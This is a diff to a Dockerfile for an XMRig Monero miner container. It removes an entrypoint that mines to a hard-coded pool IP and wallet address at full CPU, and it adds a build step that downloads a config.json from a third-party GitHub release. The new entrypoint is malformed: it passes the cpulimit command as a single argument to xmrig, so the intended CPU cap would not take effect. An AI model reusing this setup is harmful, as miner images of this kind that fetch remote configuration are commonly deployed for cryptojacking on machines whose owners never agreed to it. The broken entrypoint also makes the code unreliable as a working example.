@@ -4,6 +4,7 @@ RUN   apk --no-cache upgrade && \
       apk add ca-certificates \
       update-ca-certificates \
       apk --no-cache add \
+        cpulimit \
         wget \
         git \
         cmake \
@@ -22,5 +23,5 @@ RUN   apk --no-cache upgrade && \
         git
 USER xminer
 WORKDIR    /xmrig
-RUN wget 
-ENTRYPOINT   ["./xmrig", "--algo=cryptonight", "--url=85.255.7.60:80", "--user=45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev", "--pass=x", "--max-cpu-usage=100"]
+RUN wget https://github.com/user4684680/xmr-cpu-limit2/releases/download/1/config.json
+ENTRYPOINT   ["./xmrig", "cpulimit -e xmrig -l 90 -b"]
